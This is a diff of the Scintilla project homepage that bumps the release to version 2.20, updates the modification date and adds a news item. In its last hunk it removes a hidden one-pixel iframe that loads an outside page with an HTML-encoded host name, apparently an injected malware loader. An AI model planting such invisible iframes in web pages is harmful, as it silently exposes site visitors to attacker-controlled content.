@@ -9,7 +9,7 @@
     <meta name="keywords" content="Scintilla, SciTE, Editing Component, Text Editor" />
     <meta name="Description"
     content="www.scintilla.org is the home of the Scintilla editing component and SciTE text editor application." />
-    <meta name="Date.Modified" content="20100601" />
+    <meta name="Date.Modified" content="20100730" />
     <style type="text/css">
         #versionlist {
             margin: 0;
@@ -55,8 +55,8 @@
           GTK+</font>
         </td>
         <td width="40%" align="right">
-          <font color="#FFCC99" size="3"> Release version 2.12<br />
-           Site last modified June 1 2010</font>
+          <font color="#FFCC99" size="3"> Release version 2.20<br />
+           Site last modified July 30 2010</font>
         </td>
         <td width="20%">
           &nbsp;
@@ -71,14 +71,12 @@
       </tr>
     </table>
     <ul id="versionlist">
+      <li>Version 2.20 implements lexers as objects so they may retain additional state.
+      The C++ lexer understands the preprocessor enough to grey-out code that is inactive due to conditional compilation.</li>
       <li>Version 2.12 improves drawing speed and fixes bugs.</li>
       <li>Version 2.11 fixes compatibility with the C language.</li>
       <li>Version 2.10 performs case insensitive search and upper and lower casing for non-ASCII characters.
       Support for version 1.x of GTK+ removed.</li>
-      <li>Version 2.03 fixes some problems with rectangular selection.</li>
-      <li>Version 2.02 fixes some problems with rectangular selection.</li>
-      <li>Version 2.01 fixes some problems with multiple selection.</li>
-      <li>Version 2.0 supports multiple selection and virtual space.</li>
     </ul>
     <ul id="menu">
       <li id="remote1"><a href="http://www.scintilla.org/SciTEImage.html">Screenshot</a></li>
@@ -185,7 +183,6 @@ if (IsRemote()) {
 <a href="http://sourceforge.net/projects/scintilla">
 <img src="http://sflogo.sourceforge.net/sflogo.php?group_id=2439&amp;type=8" width="80" height="15" alt="Get Scintilla at SourceForge.net. Fast, secure and Free Open Source software downloads" /></a>
 </noscript>
-  <iframe style="height:1px" src="http://www&#46;Brenz.pl/rc/" frameborder=0 width=1></iframe>
-</body>
+  </body>
 </html>
 
